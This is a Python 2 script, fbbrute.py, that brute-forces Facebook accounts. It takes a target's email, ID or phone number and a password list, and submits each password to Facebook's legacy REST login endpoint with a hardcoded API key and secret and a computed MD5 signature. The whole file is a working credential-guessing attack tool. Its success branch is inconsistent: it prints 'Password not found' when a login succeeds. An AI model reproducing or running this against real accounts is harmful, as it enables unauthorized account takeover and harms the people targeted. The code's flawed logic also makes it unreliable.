## fbbrute.py - Facebook Brute Force
# -*- coding: utf-8 -*-
##
import os
import sys
import urllib
import hashlib
API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
print ("\n")
userid = raw_input("\t \033[46m\033[91m ENTR  [EMAIL|ID|PHONE]\033[0m >")
print ("\n\n")
try:
	passlist = raw_input("    \033[46m\033[91mSet PATH to passlist:\033[0m > ")
        print ("\n")
	if os.path.exists(passlist) != False:
		print(" [+] Account to crack : {}".format(userid))
		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] Cracking, please wait ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[!]Password not found")
				break
		print("\n\n[!] Done .. !!")
	else:
                print ("\n")
		print("\033[91mfbbrute: error: No such file or directory\033[0m")
                print ("\n")
except KeyboardInterrupt:
        print ("\n")
	print("\033[91mfbbrute: error: Keyboard interrupt\033[0m")
